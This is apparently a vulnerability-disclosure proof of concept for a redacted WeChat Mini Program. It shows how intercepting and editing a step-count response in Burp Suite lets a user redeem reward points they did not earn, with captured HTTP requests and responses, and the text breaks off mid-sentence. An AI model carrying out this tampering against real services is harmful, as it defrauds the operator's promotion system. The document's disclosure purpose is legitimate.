# Proof of Concept (PoC) for MiniPVRF in "xxxxxx" WeChat Mini Program of wx5019XXXX0906c9ff

### Promotion Abuse

## 1Prerequisites for Reproduction

- Burp Suite tool (configured properly to capture network packets of WeChat Mini Programs)
- WeChat application (to search for and open the "xxxxxxxxxxxxxxxx" Mini Program)
- A WeChat account (to authorize step data access for the mini program)

## 3. Vulnerability Reproduction Steps

### Step 1: Locate and Open the Target Mini Program

1. Launch the WeChat application.
2. Use the search function to find the WeChat Mini Program named **"xxxxxxxxxxxxx" **.
3. Click to open the searched Mini Program.
   ![image-20250827180613060](PoC-wx5019XXXX0906c9ff/image-20250827180613060.png)

### Step 2: Naviate to the Step Redemption Page

1. On the bottom navigation bar of the Mini Program homepage, click the **"Welfare" (福利)** tab.
   ![image-20250827180634031](PoC-wx5019XXXX0906c9ff/image-20250827180634031.png)
2. On the "Welfare" page, find and click the **"Redeem Environmental Beans with Steps (步数兑换环保豆)"** option.
   ![image-20250827180702170](PoC-wx5019XXXX0906c9ff/image-20250827180702170.png)
3. Since step authorization has not been completed yet, click the **"Step Authorization (步数授权)"** button on the step redemption page.
   ![image-20250827180722085](PoC-wx5019XXXX0906c9ff/image-20250827180722085.png)

### Step 3: Capture the Step Authorization Request Packet with Burp Suite

1. Enable **Intercept Mode** in Burp Suite to monitor the network requests sent by the Mini Program during step authorization.
2. On the Mini Program's step authorization page, click the **"Allow (允许)"** button when prompted to authorize WeChat step data access.
3. Burp Suite will intercept the following HTTP GET request packet (used to obtain step data after authorization):

```http
GET /step/weixin/auth?code=0d12ioFa1zndqJ0NsPHa1Bpt1632ioF1&encryptedData=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxPGgIWrABvCsA%2BhFaPlpQd92SeAtShAxqdr8%2FyeWF%2FDj52pVoxYIKFTDP0wvw%2BnWKB6QXuFH88kwVB0QB053wFCewvdPBVd7k3MCV6veszEx8fI0Hshr12YdFVw&iv=yz862hFf%2Bd4q0nycRopigg%3D%3D&version=V2.00.01&platformKey=F2EE24892FBF66F0AFF8C0EB532A9394&mini_scene=1007&partner_ext_infos= HTTP/2
Host: xxxxxxxxx.com
Connection: keep-alive
Device-Model: iPhone 12<iPhone13,2>
Device-Version: iOS 17.1.1
Content-Type: application/json;charset=utf8
Authorization: bearer xxxxxxxxxxxxxxxxxxxxxx
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.56(0x1800383b) NetType/WIFI Language/zh_CN
Referer: https://servicewechat.com/wx5019XXXX0906c9ff/446/page-frame.html
```



![image-20250827180827945](PoC-wx5019XXXX0906c9ff/image-20250827180827945.png)

### Step 4: Intercept and Tamper with the Step Data Response Packet

1. Keep Burp Suite in Intercept Mode and wait for the target server xxxxxxxxxxx to return the **response packet** corresponding to the step authorization request.
   ![image-20250827180917112](PoC-wx5019XXXX0906c9ff/image-20250827180917112.png)

2. The original response packet (with a 200 OK status) contains the current day's step count and remaining available steps. The original response content is as follows:

   ```json
   HTTP/2 200 OK
   Date: Thu, 17 Apr 2025 17:28:10 GMT
   Content-Type: text/html; charset=UTF-8
   Server: nginx
   Vary: Accept-Encoding
   Access-Control-Allow-Origin: *
   Access-Control-Allow-Headers: Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With, platformKey
   Access-Control-Allow-Methods: GET, POST, PATCH, PUT, DELETE
   Access-Control-Max-Age: 1728000
   Strict-Transport-Security: max-age=31536000
   
   {"code":200, "message":"获取成功","data": {"today":0, "leftStep":0}}
   ```

   - `today`: Step count generated on the current day (original value: 0)
   - `leftStep`: Remaining steps available for points redemption (original value: 0)

3. Tamper with the leftStep field in the data object to modify the remaining available steps. For example, change the value from  0

    to  4000 (a larger number to enable multiple points redemptions). The tampered response packet is as follows:

   

   ```json
   HTTP/2 200 OK
   Date: Thu, 17 Apr 2025 17:22:31 GMT
   Content-Type: text/html; charset=UTF-8
   Server: nginx
   Vary: Accept-Encoding
   Access-Control-Allow-Origin: *
   Access-Control-Allow-Headers: Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With, platformKey
   Access-Control-Allow-Methods: GET, POST, PATCH, PUT, DELETE
   Access-Control-Max-Age: 1728000
   Strict-Transport-Security: max-age=31536000
   Content-Length: 71
   
   {"code":200, "message":"获取成功","data": {"today":0, "leftStep":4000}}
   ```

   Refer to the attached image: Burp Suite interface showing the tampered response packet with modified `leftStep` value

### Step 5: Complete Arbitrary Points Redemption

1. Click the **"Forward"** button in Burp Suite to send the tampered step data response packet to the Mini Program.

2. Disable Intercept Mode in Burp Suite to allow subsequent redemption requests to pass normally.

3. On the Mini Program's step redemption page, the tampered step count (4000 steps) will be recognized. Click the **"Redeem (兑换)"** button to initiate the points redemption request.

4. Burp Suite will capture the following HTTP POST request packet for points redemption (the steps field in the request body matches the tampered step count):

   ```http
   POST /step/exchange HTTP/2
   Host: xxxxxxxxxxxx
   Content-Length: 125
   Device-Model: iPhone 12<iPhone13,2>
   Device-Version: iOS 17.1.1
   Content-Type: application/json;charset=utf8
   Authorization: bearer xxxxxxxxxxxxxxxxxxxxxxxx
   Accept-Encoding: gzip, deflate
   User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.56(0x1800383b) NetType/WIFI Language/zh_CN
   Referer: https://servicewechat.com/wx5019XXXX0906c9ff/446/page-frame.html
   
   {"steps":4000,"version":"V2.00.01","platformKey":"F2EE24892FBF66F0AFF8C0EB532A9394","mini_scene":1007,"partner_ext_infos":""}
   ```

5. The server will return a successful redemption response, confirming that the arbitrary step modification leads to successful points redemption. The server response is as follows:

   

   ```json
   HTTP/2 200 OK
   Date: Thu, 17 Apr 2025 17:29:06 GMT
   Content-Type: text/html; charset=UTF-8
   Server: nginx
   Vary: Accept-Encoding
   Access-Control-Allow-Origin: *
   Access-Control-Allow-Headers: Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With, platformKey
   Access-Control-Allow-Methods: GET, POST, PATCH, PUT, DELETE
   Access-Control-Max-Age: 1728000
   Strict-Transport-Security: max-age=31536000
   
   {"code":200,"message":"兑换成功","data":{"leftSteps":3000}}
   ```

   - `message": "兑换成功"`: Indicates successful points redemption
   - `leftSteps": 3000`: 